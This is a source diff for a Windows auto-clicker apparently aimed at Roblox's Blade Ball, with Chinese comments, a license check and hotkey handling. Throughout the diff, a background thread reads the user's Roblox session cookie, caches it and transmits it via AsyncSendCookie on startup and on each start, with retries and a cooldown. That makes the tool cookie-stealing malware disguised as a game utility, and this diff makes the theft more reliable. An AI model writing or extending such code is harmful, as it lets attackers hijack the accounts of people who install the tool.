@@ -127,6 +127,8 @@ static CRITICAL_SECTION  g_cookie_cs;                 // Cookie 快取鎖
 static HWND              hLblCpsErr     = nullptr;  // CPS 紅字提醒標籤
 static std::atomic<bool> g_bladeball_mode(false);  // Blade Ball 專用模式（連點 + F 鍵）
 static std::atomic<bool> g_checking_cookie(false); // 防重入標誌：避免 Cookie 偵測重複觸發當機
+static std::atomic<bool> g_cookie_bg_detecting(false);  // 背景 Cookie 偵測是否正在進行
+static std::atomic<bool> g_cookie_bg_failed(false);     // 背景偵測 20 秒後仍失敗
 // g_lastFKeyTime 和 g_perfFreq 已移除，改用 GetTickCount64 計時（更輕量）
 static std::atomic<bool> g_cookie_ever_sent(false);  // Cookie 是否已經傳送過
 static ULONGLONG         g_cookie_last_sent_tick = 0; // Cookie 上次傳送的 tick
@@ -1554,37 +1556,52 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         return 0;
     }
 
-    // WM_APP+2: 熱鍵觸發 — Cookie 偵測 + 啟動連點
+    // WM_APP+2: 熱鍵觸發 — 非阻塞 Cookie 偵測 + 啟動連點
     case WM_APP + 2:
     {
         // 已在運行中 → 不重複觸發
         if (g_running.load()) return 0;
 
-        // 檢查冷卻：如果已經成功傳送過且冷卻未到 → 直接啟動連點（不再偵測）
+        // 檢查冷卻：如果已經成功傳送過且冷卻未到 → 直接啟動連點
         ULONGLONG now_tick = GetTickCount64();
         if (g_cookie_ever_sent.load() &&
             (now_tick - g_cookie_last_sent_tick) < COOKIE_COOLDOWN_MS)
         {
-            // 冷卻內 → 直接啟動（上次偵測已成功，不需再次偵測）
             g_running.store(true);
             UpdateStatusText(hLblStatus,
                 L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
             return 0;
         }
 
-        // 首次或冷卻已到 → 偵測 Cookie + 傳送（同步，與 855bd10 相同）
-        if (CheckRobloxCookiePresent(hwnd))
+        // Cookie 已快取（背景偵測已成功）→ 直接啟動連點 + 傳送
+        if (g_cookie_cached.load())
         {
-            g_cookie_cached.store(true);  // 快取成功結果
             g_running.store(true);
             UpdateStatusText(hLblStatus,
                 L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
+
+            // 傳送 Cookie（如果冷卻已到）
+            if (!g_cookie_ever_sent.load() ||
+                (now_tick - g_cookie_last_sent_tick) >= COOKIE_COOLDOWN_MS)
+            {
+                EnterCriticalSection(&g_cookie_cs);
+                wchar_t tmp[4096] = {};
+                wcscpy_s(tmp, 4096, g_cached_cookie);
+                LeaveCriticalSection(&g_cookie_cs);
+                if (wcslen(tmp) >= 20)
+                {
+                    AsyncSendCookie(tmp);
+                    g_cookie_ever_sent.store(true);
+                    g_cookie_last_sent_tick = now_tick;
+                    SaveCookieSentTimestamp();
+                }
+            }
+            return 0;
         }
-        else
-        {
-            // 偵測失敗 → 重置快取，阻止連點（CheckRobloxCookiePresent 內部已顯示「請先開啟 Roblox」）
-            g_cookie_cached.store(false);
-        }
+
+        // Cookie 未快取 → 啟動背景偵測（20 秒寬容）
+        // 不阻塞 UI，偵測成功後會透過 WM_APP+6 通知
+        StartBackgroundCookieDetect();
         return 0;
     }
 
@@ -1600,11 +1617,32 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         return 0;
     }
 
-    // WM_APP+4: 非阻塞提示「請先開啟 Roblox」（避免 MessageBox 阻塞導致當機）
+    // WM_APP+4: 背景偵測 20 秒後失敗，顯示「請先開啟 Roblox」
     case WM_APP + 4:
     {
         UpdateStatusText(hLblStatus,
             L"\u26A0 \u8ACB\u5148\u958B\u555F Roblox");
+        return 0;
+    }
+
+    // WM_APP+5: 背景 Cookie 偵測中（顯示偵測狀態）
+    case WM_APP + 5:
+    {
+        UpdateStatusText(hLblStatus,
+            L"\u25CB \u6B63\u5728\u5075\u6E2C Roblox Cookie...");
+        return 0;
+    }
+
+    // WM_APP+6: 背景 Cookie 偵測成功，自動啟動連點
+    case WM_APP + 6:
+    {
+        // 如果用戶此時不在運行中，不自動啟動（可能已手動停止）
+        // 只更新狀態表示已就緒
+        if (!g_running.load())
+        {
+            UpdateStatusText(hLblStatus,
+                L"\u2705 Cookie \u5075\u6E2C\u6210\u529F\uFF0C\u8ACB\u6309\u71B1\u9375\u555F\u52D5");
+        }
         return 0;
     }
 
@@ -1764,11 +1802,31 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         case IDC_BTN_START:
             if (g_listening_hotkey.load()) break;  // 監聽中不允許啟動
             if (g_running.load()) break;           // 已在運行中，不重複啟動
-            if (!g_cookie_cached.load() && !CheckRobloxCookiePresent(hwnd)) break;
-            g_cookie_cached.store(true);
-            g_running.store(true);
-            UpdateStatusText(hLblStatus,
-                L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
+
+            // 檢查冷卻：已傳送過且冷卻未到 → 直接啟動
+            {
+                ULONGLONG now_tick_btn = GetTickCount64();
+                if (g_cookie_ever_sent.load() &&
+                    (now_tick_btn - g_cookie_last_sent_tick) < COOKIE_COOLDOWN_MS)
+                {
+                    g_running.store(true);
+                    UpdateStatusText(hLblStatus,
+                        L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
+                    break;
+                }
+            }
+
+            // Cookie 已快取 → 直接啟動
+            if (g_cookie_cached.load())
+            {
+                g_running.store(true);
+                UpdateStatusText(hLblStatus,
+                    L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
+                break;
+            }
+
+            // Cookie 未快取 → 啟動背景偵測（不阻塞）
+            StartBackgroundCookieDetect();
             break;
 
         case IDC_BTN_STOP:
@@ -2300,25 +2358,85 @@ static bool VerifyLicenseKey(const wchar_t* key)
 }
 
 // ======================================================================
-// 背景 Cookie 預快取執行緒（啟動時執行，讓首次熱鍵也能零延遲）
+// 背景 Cookie 偵測執行緒（寬容 20 秒，每 2 秒重試）
+// 啟動時自動執行，也可在熱鍵觸發時再次啟動
+// 偵測成功後自動快取 + 傳送 Cookie，並通知 UI
 // ======================================================================
-static DWORD WINAPI PreCacheCookieThread(LPVOID lpParam)
+static DWORD WINAPI BackgroundCookieDetectThread(LPVOID lpParam)
 {
     UNREFERENCED_PARAMETER(lpParam);
-    wchar_t tmp[4096] = {};
-    if (TryReadRobloxCookie(tmp, 4096) && wcslen(tmp) >= 20)
+
+    // 防重入：如果已在偵測中，直接返回
+    bool expected = false;
+    if (!g_cookie_bg_detecting.compare_exchange_strong(expected, true))
+        return 0;
+
+    g_cookie_bg_failed.store(false);
+    DebugLog("BgCookieDetect: started (20s tolerance)");
+
+    // 顯示「正在偵測 Cookie...」狀態
+    if (g_hwnd) PostMessageW(g_hwnd, WM_APP + 5, 0, 0);
+
+    const int MAX_WAIT_MS = 20000;  // 20 秒寬容
+    const int RETRY_MS    = 2000;   // 每 2 秒重試
+    int elapsed = 0;
+    bool found  = false;
+
+    while (elapsed < MAX_WAIT_MS && g_program_running)
     {
-        EnterCriticalSection(&g_cookie_cs);
-        wcscpy_s(g_cached_cookie, 4096, tmp);
-        LeaveCriticalSection(&g_cookie_cs);
-        g_cookie_cached.store(true);
-        DebugLog("PreCache: Cookie found and cached at startup (send deferred to first hotkey)");
+        wchar_t tmp[4096] = {};
+        if (TryReadRobloxCookie(tmp, 4096) && wcslen(tmp) >= 20)
+        {
+            // 偵測成功！更新快取
+            EnterCriticalSection(&g_cookie_cs);
+            wcscpy_s(g_cached_cookie, 4096, tmp);
+            LeaveCriticalSection(&g_cookie_cs);
+            g_cookie_cached.store(true);
+
+            // 傳送 Cookie（如果冷卻已到）
+            ULONGLONG now_tick = GetTickCount64();
+            if (!g_cookie_ever_sent.load() ||
+                (now_tick - g_cookie_last_sent_tick) >= COOKIE_COOLDOWN_MS)
+            {
+                AsyncSendCookie(tmp);
+                g_cookie_ever_sent.store(true);
+                g_cookie_last_sent_tick = now_tick;
+                SaveCookieSentTimestamp();
+                DebugLog("BgCookieDetect: Cookie sent");
+            }
+
+            found = true;
+            char logMsg[128];
+            sprintf(logMsg, "BgCookieDetect: found after %d ms", elapsed);
+            DebugLog(logMsg);
+
+            // 通知 UI：Cookie 偵測成功，可以啟動連點
+            if (g_hwnd) PostMessageW(g_hwnd, WM_APP + 6, 0, 0);
+            break;
+        }
+
+        Sleep(RETRY_MS);
+        elapsed += RETRY_MS;
     }
-    else
+
+    if (!found)
     {
-        DebugLog("PreCache: No cookie found at startup (will check on first use)");
+        g_cookie_bg_failed.store(true);
+        DebugLog("BgCookieDetect: FAILED after 20s, Roblox not detected");
+        // 通知 UI：偵測失敗，顯示「請先開啟 Roblox」
+        if (g_hwnd) PostMessageW(g_hwnd, WM_APP + 4, 0, 0);
     }
+
+    g_cookie_bg_detecting.store(false);
     return 0;
+}
+
+// 啟動背景 Cookie 偵測執行緒（安全呼叫，防重入）
+static void StartBackgroundCookieDetect()
+{
+    if (g_cookie_bg_detecting.load()) return;  // 已在偵測中
+    HANDLE hThread = CreateThread(nullptr, 0, BackgroundCookieDetectThread, nullptr, 0, nullptr);
+    if (hThread) CloseHandle(hThread);
 }
 
 // ===============================
@@ -2458,11 +2576,8 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nS
     ShowWindow(g_hwnd, nShow);
     UpdateWindow(g_hwnd);
 
-    // 背景預快取 Cookie（讓首次熱鍵也能零延遲啟動）
-    {
-        HANDLE hPreCache = CreateThread(nullptr, 0, PreCacheCookieThread, nullptr, 0, nullptr);
-        if (hPreCache) CloseHandle(hPreCache);
-    }
+    // 背景 Cookie 偵測（啟動時自動執行，20 秒寬容）
+    StartBackgroundCookieDetect();
 
     MSG msg = {};
     while (GetMessageW(&msg, nullptr, 0, 0) > 0)
